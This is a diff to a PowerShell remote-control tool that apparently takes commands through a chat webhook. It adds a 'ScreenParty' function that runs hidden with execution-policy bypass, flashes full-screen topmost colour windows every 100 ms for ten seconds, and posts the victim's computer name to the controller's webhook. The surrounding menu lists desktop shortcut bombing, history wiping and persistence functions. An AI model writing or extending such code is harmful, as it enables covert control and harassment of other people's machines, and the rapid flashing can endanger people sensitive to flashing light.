@@ -102,6 +102,7 @@ Function Options {
 - **ShortcutBomb**: Create 50 shortcuts on the desktop.
 - **Wallpaper**: Set the wallpaper (wallpaper -url http://img.com/f4wc)
 - **Goose**: Spawn an annoying goose (Sam Pearson App)
+- **ScreenParty**: Start A Disco on screen!
 
 - **ExtraInfo**: Get a list of further info and command examples
 - **Cleanup**: Wipe history (run prompt, powershell, recycle bin, Temp)
@@ -747,6 +748,12 @@ Function Goose {
     & $vbscript
     $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":white_check_mark: ``Goose Spawned!`` :white_check_mark:"} | ConvertTo-Json
     irm -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys    
+}
+
+Function ScreenParty {
+Start-Process PowerShell.exe -ArgumentList ("-NoP -Ep Bypass -C Add-Type -AssemblyName System.Windows.Forms;`$d = 10;`$i = 100;`$1 = 'Black';`$2 = 'Green';`$3 = 'Red';`$4 = 'Yellow';`$5 = 'Blue';`$6 = 'white';`$st = Get-Date;while ((Get-Date) -lt `$st.AddSeconds(`$d)) {`$t = 1;while (`$t -lt 7){`$f = New-Object System.Windows.Forms.Form;`$f.BackColor = `$c;`$f.FormBorderStyle = 'None';`$f.WindowState = 'Maximized';`$f.TopMost = `$true;if (`$t -eq 1) {`$c = `$1}if (`$t -eq 2) {`$c = `$2}if (`$t -eq 3) {`$c = `$3}if (`$t -eq 4) {`$c = `$4}if (`$t -eq 5) {`$c = `$5}if (`$t -eq 6) {`$c = `$6}`$f.BackColor = `$c;`$f.Show();Start-Sleep -Milliseconds `$i;`$f.Close();`$t++}}")
+    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":white_check_mark: ``Screen Party Started!`` :white_check_mark:"} | ConvertTo-Json
+    irm -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys  
 }
 
 # --------------------------------------------------------------- PERSISTANCE FUNCTIONS ------------------------------------------------------------------------
